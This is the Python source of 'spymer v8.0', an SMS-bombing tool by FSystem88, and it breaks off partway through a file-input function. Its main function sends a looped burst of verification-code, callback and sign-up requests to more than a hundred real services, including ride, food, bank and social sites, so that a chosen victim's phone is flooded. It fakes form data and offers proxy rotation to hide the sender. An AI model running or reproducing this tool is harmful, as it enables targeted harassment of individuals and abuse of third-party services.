#!/usr/bin/python3
# spymer v8.0
# Author: FSystem88
import os
def MAIN():
	try:
		import requests
		import random
		import datetime
		import sys
		import re
		import time
		import datetime
		import json
		import threading
		from threading import Thread
		from colorama import Fore, Back, Style
		from random import randint
		def Main():
			global phone
			global info
			global proxy
			global ssl
			global proxies

			def mask(str, maska):
				if len(str) == maska.count('#'):
					str_list = list(str)
					for i in str_list:
						maska=maska.replace("#", i, 1)
					return maska

			def sms():
				global phone
				global name
				global password
				global email
				global proxies
				phone9 = phone[1:]
				try:
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""})
					except:
						pass
					try:
						requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone})
					except:
						pass
					try:
						phonee=mask(str=phone[1:], maska="8(###)###-##-##")
						requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonee})
					except:
						pass
					try:
						requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonee, "code":""})
					except:
						pass
					try:
						requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
					except:
						pass
					try:
						requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone})
					except:
						pass
					try:
						requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone})
					except:
						pass
					try:
						requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""})
					except:
						pass
					try:
						requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
					except:
						pass
					try:
						requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) })
						requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}) 
					except:
						pass
					try:
						# под сомнением 
						phonee=mask(str=phone, maska="#(###)###-##-##")
						requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonee})

						phonee=mask(str=phone, maska="+#(###)###-##-##")
						requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"})
					except:
						pass
					try:
						requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone},)
					except:
						pass
					try:
						requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
					except:
						pass
					try:
						requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonee})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="8(###)###-##-##")
						requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonee})
					except:
						pass
					try:
						requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone})
					except:
						pass
					try:
						requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}})
					except:
						pass
					try:
						requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone})
					except:
						pass
					try:
						requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"},)
					except:
						pass
					try:
						phonee=mask(phone, maska="+# (###) ### - ## - ##")
						requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone})
					except:
						pass
					try:
						requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="(+#)##########")
						requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonee, "type": 1}})
					except:
						pass
					try:
						requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone})
					except:
						pass
					try:
						requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone,})
					except:
						pass
					try:
						requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name},)
					except:
						pass
					try:
						requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone})
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="8(###)###-##-##")
						requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonee})
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="8 (###) ###-##-##")
						requests.post("http://sushigourmet.ru/auth",data={"phone": phonee, "stage": 1})
					except:
						pass
					try:
						requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone})
					except:
						pass
					try:
						requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0})
					except:
						pass
					try:
						requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone},)
					except:
						pass
					try:
						requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone,},)
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="8-###-###-##-##")
						requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonee})
					except:
						pass
					try:
						requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee})
					except:
						pass
					try:
						requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
					except:
						pass
					try:
						requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"})
					except:
						pass
					try:
						requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0})
					except:
						pass
					try:
						requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",})
					except:
						pass
					try:
						requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
					except:
						pass
					try:
						requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
					except:
						pass
					try:
						requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}})
					except:
						pass
					try:
						requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone})
					except:
						pass
					try:
						requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"},)
					except:
						pass
					try:
						requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0},)
					except:
						pass
					try:
						requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+#(###)###-##-##")
						requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonee, "alien": "0"})
					except:
						pass
					try:
						requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone})
					except:
						pass
					try:
						requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
					except:
						pass
					try:
						requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))})
					except:
						pass
					try:
						requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+#-###-###-##-##")
						requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonee}})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonee})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonee})
					except:
						pass
					try:
						requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="8-###-###-##-##")
						requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonee})
					except:
						pass
					try:
						requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9})
					except:
						pass
					try:
						requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-####")
						requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonee})
					except:
						pass
					try:
						requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone},)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+#-###-###-##-##")
						requests.post("https://paylate.ru/registry",data={"mobile": phonee,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"})
					except:
						pass
					try:
						requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9})
					except:
						pass
					try:
						requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-####")
						requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonee})
					except:
						pass
					try:
						requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
					except:
						pass
					try:
						requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
					except:
						pass
					try:
						requests.post(
							"https://www.ollis.ru/gql",
							json={{"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}})
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="8 (###) ###-##-##")
						requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonee,"call_time": "1","pravila2": "on"})
					except:
						pass
					try:
						requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone})
					except:
						pass
					try:
						requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone})
					except:
						pass
					try:
						requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
					except:
						pass
					try:
						requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"})
					except:
						pass
					try:
						requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
					except:
						pass
					try:
						requests.post("https://auth.multiplex.ua/login", json={"login": phone})
					except:
						pass
					try:
						requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone})
					except:
						pass
					try:
						requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email})
					except:
						pass
					try:
						requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone})
					except:
						pass
					try:
						requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone},)
					except:
						pass
					try:
						requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data="+"+phone)
					except:
						pass
					try:
						requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"})
					except:
						pass
					try:
						requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ### ## ##")
						requests.get(f"http://mnogomenu.ru/office/password/reset/"+phonee)
					except:
						pass
					try:
						requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
					except:
						pass
					try:
						requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name, "phone": phone, "phone_number": "1"})
					except:
						pass
					try:
						requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
					except:
						pass
					try:
						requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# ### ### ## ##")
						requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": phonee})
					except:
						pass
					try:
						requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"})
					except:
						pass
					try:
						requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
					except:
						pass
					try:
						requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
					except:
						pass
					try:
						requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}})
					except:
						pass
					try:
						requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+phone})
					except:
						pass
					try:
						requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone})
					except:
						pass
					try:
						requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone":phone, "Type": 1})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="# (###) ###-##-##")
						requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": phonee })
					except:
						pass
					try:
						requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+"+phone})
					except:
						pass
					try:
						requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9})
					except:
						pass
					try:
						requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone})
					except:
						pass
					try:
						requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
					except:
						pass
					try:
						requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone})
					except:
						pass
					try:
						requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+## (###) ###-##-##")
						requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": phonee})
					except:
						pass
					try:
						requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password,"application": "lkp","login": "+"+phone})
					except:
						pass
					try:
						requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email})
					except:
						pass
					try:
						requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone})
					except:
						pass
					try:
						requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"})
					except:
						pass
					try:
						requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"})
					except:
						pass
					try:
						requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
					except:
						pass
					try:
						requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
					except:
						pass
					try:
						requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"})
					except:
						pass
					try:
						requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"})
					except:
						pass
					try:
						requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}},)
					except:
						pass
					try:
						requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
					except:
						pass
					try:
						requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": phonee,"g-recaptcha-response": ""})
					except:
						pass
					try:
						requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
					except:
						pass
					try:
						requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
					except:
						pass
					try:
						requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True})
					except:
						pass
					try:
						requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
					except:
						pass
					try:
						requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
					except:
						pass
					try:
						requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://2407.smartomato.ru/account/session",json={"phone": phonee,"g-recaptcha-response": None})
					except:
						pass
					try:
						requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"})
					except:
						pass
					try:
						requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+## (###) ###-##-##")
						requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": phonee,"password": password,"password2": password})
					except:
						pass
					try:
						requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone})
					except:
						pass
					try:
						requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "password": password})
					except:
						pass
					try:
						requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
					except:
						pass
					try:
						requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": phonee,"type": "register"})
					except:
						pass
					try:
						requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"})
					except:
						pass
					try:
						requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone})
					except:
						pass
					try:
						requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://cinema5.ru/api/phone_code",data={"phone": phonee})
					except:
						pass
					try:
						requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"})
					except:
						pass
					try:
						requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
					except:
						pass
					try:
						requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="(###)###-##-##")
						requests.post("https://bluefin.moscow/auth/register/",data={"phone": phonee, "sendphone": "Далее"})
					except:
						pass
					try:
						requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": phonee})
					except:
						pass
					try:
						requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Запросить смс подтверждения","rules": "on"})
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="(###) ###-##-##")
						requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": phonee})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://oauth.av.ru/check-phone",json={"phone": phonee})
					except:
						pass
					try:
						requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonee,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
					except:
						pass
				except:
					pass
				
			def clear():
				os.system('cls' if os.name=='nt' else 'clear')
				pass

			def checkver():
				global info
				ver = '80'
				version = requests.post("https://fsystem88.ru/spymer/version.php").json()["version"]
				if int(ver) < int(version):
					info=Back.RED+"\nВерсия устарела и нуждается в обновлении!"+Style.RESET_ALL

			def logo():
				logo = Fore.GREEN+"8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.8.0      8888\n8888     MPL-2.0     8888\n8888888888888888888888888\n8888888888888888888888888"+Style.RESET_ALL
				print(logo)

			def checkspamlist():
				global phone
				global info
				print ("Войдите в телефон для проверки:")
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				make7phone()
				try:
					if int(phone):
						id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
						if int(id) > 0:
							info = Fore.GREEN+"\nТелефон {} находится в антиспам листе.".format(phone)+Style.RESET_ALL
						elif int(id) == 0:
							info = Fore.RED+"\nТелефон {} не находится в антиспам листе.".format(phone)+Style.RESET_ALL
				except:
					info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL

			def addantispam():
				global phone
				global info

				print ("Введите номер:")
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				make7phone()
				try:
					if int(phone):
						id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
						if int(id) > 0:
							info = Fore.GREEN+"\nPhone {} is allready in antispam list.".format(phone)+Style.RESET_ALL
						elif int(id) == 0:
							result=requests.post('https://fsystem88.ru/spymer/ajax.php', data={'phone': phone}).json()["result"]
							if result == "no":
								info = Fore.RED+"\nТелефон {} НЕ добавлен в антиспам лист.\nВо избежание DDoS подождите час с момента последнего доавления номера в антиспам.".format(phone)+Style.RESET_ALL
							elif result == "yes":
								info = Fore.GREEN+"\nТелефон {} добавлен в антиспам лист.".format(phone)+Style.RESET_ALL
							elif result == "error":
								info = Fore.RED+"Ошибка"+Style.RESET_ALL
				except:
					info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL

			def updateproxy():
				global proxy
				global ssl
				global info
				try:
					print ("Введите http(s)://IP:port proxy.")
					print ("Пример: "+Fore.GREEN+"https://123.45.6.78:8080"+Style.RESET_ALL)
					print ("Для отмены нажмите Ctrl+C")
					prox = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
					if prox[:5]=="https":
						ssl="https"
						proxy=prox[8:]
					elif prox[:5]=="http:":
						ssl="http"
						proxy=prox[7:]
					else:
						info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
						proxy = "localhost"
				except:
					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
					proxy = "localhost"

			def generateproxy():
				global ssl
				global proxy
				url="https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=500&country=RU&anonymity=elite&ssl=yes"
				a=requests.get(url)
				ssl="https"
				proxy=a.text.splitlines()[0]

			def make7phone():
				global phone
				if phone[0] == '+':
					phone = phone[1:]
				elif phone[0] == '8':
					phone = '7'+phone[1:]
				elif phone[0] == '9':
					phone = '7'+phone

			def addparams():
				global name
				global password
				global email
				name = ''
				for x in range(12):
					name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
					password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
					email = "{}@gmail.com".format(name)

			def update():
				a=input("Вы уверены, что хотите обновить? (y/n) ")
				if a=="y":
					os.system("cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh")
					exit()
				else:
					print("Отменено")

			def onesend():
				global phone
				global name
				global password
				global email
				global ssl
				global proxy
				global info
				global proxies
				clear()
				logo()
				print(info)
				print('Введите телефон ("Enter" - отмена):')
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				try:
					if int(phone):
						print('Введите количество кругов ("Enter" - отмена):')
						count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						try:
							if int(count):
								count=int(count)
								make7phone()
								iteration = 0
								id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
								if int(id) > 0:
									info = Fore.RED+"\nНомер телефона находится в антиспам листе."+Style.RESET_ALL
								elif int(id)==0:
									addparams()
									info = '\nТелефон: {}\nКол-во кругов: {}'.format(phone, count)+'\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.'
									clear()
									logo()
									print(info)
									if proxy=="localhost":
										proxies=None
									else:
										proxies={ssl:proxy}
									while iteration < count:
										addparams()
										sms()
										iteration+=1
										print("{} круг пройден.".format(iteration))
									info = Fore.BLUE+"\nГотово.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
						except:
							info=Fore.RED+"Неверно введено кол-во кругов"+Style.RESET_ALL
				except:
					info=Fore.RED+"Неверно введен номер телефона"+Style.RESET_ALL

			def filesend():
				global phone
				global name
				global password
				global email
				global ssl
				global proxy
				global info
				global proxies
				clear()
				logo()
				print(info)
				print("Введите путь к файлу: ")
				print("(Папка с файлом должна находиться в домашней дирректории!)")
				print("Не знаешь, как создать файл в терминале - воспользуйся токеном!")
				f_name=input(Fore.BLUE+"spymer > "+Style.RESET_ALL+"~/")
